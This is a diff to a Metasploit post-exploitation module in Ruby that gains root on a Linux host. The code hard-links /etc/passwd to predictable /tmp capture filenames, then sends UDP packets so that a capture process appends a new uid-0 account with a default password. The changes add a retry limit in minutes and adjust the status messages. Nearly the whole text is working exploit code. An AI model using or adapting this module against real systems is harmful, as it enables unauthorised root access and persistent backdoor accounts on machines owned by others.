@@ -20,7 +20,7 @@ load 'lib/msf/core/exploit/local/unix.rb'
 load 'lib/msf/core/exploit/local/linux.rb'
 
 class Metasploit3 < Msf::Post
-	Rank = ExcellentRanking
+	Rank = ManualRanking
 
 	include Msf::Post::File
 	include Msf::Post::Common
@@ -63,28 +63,40 @@ class Metasploit3 < Msf::Post
 			[	
 				Opt::RPORT(2940),
 				OptString.new("USERNAME", [ true, "Username for the new superuser", "metasploit" ]),
-				OptString.new("PASSWORD", [ true, "Password for the new superuser", "metasploit" ])
+				OptString.new("PASSWORD", [ true, "Password for the new superuser", "metasploit" ]),
+				OptInt.new("MINUTES", [true, "Number of minutes to try to inject", 5])
 			], self)
 	end
 
+	def normalize_minutes
+		datastore["MINUTES"].abs rescue 0
+	end
+
 	def run
-		print_status "Waiting for victim"
+		print_status "Setting up the victim's /tmp dir"
 		initial_size = cmd_exec("cat /etc/passwd | wc -l")
+		print_status "/etc/passwd is currently #{initial_size} lines long"
 		i = 0
-		while(true) do
+		j = 0
+		loop do
 			if (i == 0)
+				j += 1
+				break if j >= datastore['MINUTES'] + 1 # Give up after X minutes
 				# 0a2940: cmd_exec is slow, so send 1 command to do all the links
+				print_status "Linking /etc/passwd to predictable tmp files (Attempt #{j})"
 				cmd_exec("for i in `seq 0 120` ; do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
 			end
-			if (cmd_exec("cat /etc/passwd | wc -l") != initial_size)
+			current_size = cmd_exec("cat /etc/passwd | wc -l")
+			if current_size == initial_size
 				# PCAP is flowing
 				pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
-				print_status("Sending file contents payload to #{session.session_host}")
+				vprint_status("Sending /etc/passwd file contents payload to #{session.session_host}")
 				udpsock = Rex::Socket::Udp.create(
 				{
 					'Context' => {'Msf' => framework, 'MsfExploit'=>self}
 				})
-				udpsock.sendto(pkt, session.session_host, datastore['RPORT'])
+				res = udpsock.sendto(pkt, session.session_host, datastore['RPORT'])
+			else
 				break
 			end
 			sleep(1) # wait a second
@@ -93,8 +105,9 @@ class Metasploit3 < Msf::Post
 
 		if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false").include?("true") 
 			print_good("Success. You should now be able to login or su to the '" + datastore['USERNAME'] + "' account")
+			# TODO: Consider recording our now-created username and password as a valid credential here.
 		else
-			print_error("Failed. You should manually verify the '" + datastore['USERNAME'] + "' user has not been added")	
+			print_error("Failed, the '" + datastore['USERNAME'] + "' user does not appear to have been added")	
 		end 
 		# 0a2940: Initially the plan was to have this post module switch user, upload & execute a new payload
 		#	  However beceause the session is not a terminal, su will not always allow this.		
